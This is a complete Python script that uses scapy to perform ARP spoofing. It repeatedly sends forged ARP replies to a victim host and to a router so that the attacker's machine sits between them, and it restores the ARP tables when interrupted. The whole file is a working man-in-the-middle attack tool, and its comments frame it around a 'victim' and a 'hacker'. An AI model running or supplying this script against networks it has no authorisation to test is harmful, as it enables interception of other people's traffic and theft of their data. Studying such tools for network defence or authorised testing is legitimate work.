#!/usr/bin/env python

from scapy.all import * 
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="ip address to spoof")
    parser.add_argument('iface',type=str,help="enter the interface aka dev")
    parser.add_argument('ip_victim',type=str,help="enter victim ip addr")
    parser.add_argument('ip_router',type=str,help="enter router ip addr")
    args=parser.parse_args()
    return args

def get_mac(ip,iface):
    clients_list=[]
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface,timeout=1,verbose=False)
    for i in ans:
        client_dict={'ip':i[1].psrc,'mac':i[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list[0]['mac']

def spoof(iface,target_ip,spoof_ip):
    #spoof_ip - ip,that hacker want to be seen by target
    target_mac=get_mac(target_ip,iface)
    arp_answer=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    send(arp_answer,iface=iface,verbose=False)

def restore(iface, dest_ip, source_ip):
    #restore arp table on dest ip
    dest_mac=get_mac(dest_ip,iface)
    source_mac=get_mac(source_ip,iface)
    packet=ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac)
    send(packet,iface=iface,verbose=False,count=4)

def main():    
    args = get_arguments()
    sent_packet_count=0
    try:
        while True:
            #operation on victim_arp_table:
            spoof(args.iface,args.ip_victim,args.ip_router) 
            #operation on router_arp_table: 
            spoof(args.iface,args.ip_router,args.ip_victim)
            sent_packet_count=sent_packet_count+2
            #dynamic output:
            print('\r[+] Packet sent: ['+str(sent_packet_count)+']',end='')
            time.sleep(2)
    except KeyboardInterrupt:
        #catch CTRL+C
        print("\n\r[-] Detected CTRL+C... Restoring ARP tables. Please wait...")
        restore(args.iface,args.ip_router,args.ip_victim)
        restore(args.iface,args.ip_victim,args.ip_router)
    except IndexError:
        #catch not-reachable ip
        print("\n\r[-] ip u have entered is OFF...Try another one.")
    except PermissionError:
        print('\n\r[-] sorry...u need sudo privilege...')
        
if __name__ == "__main__":
    main()
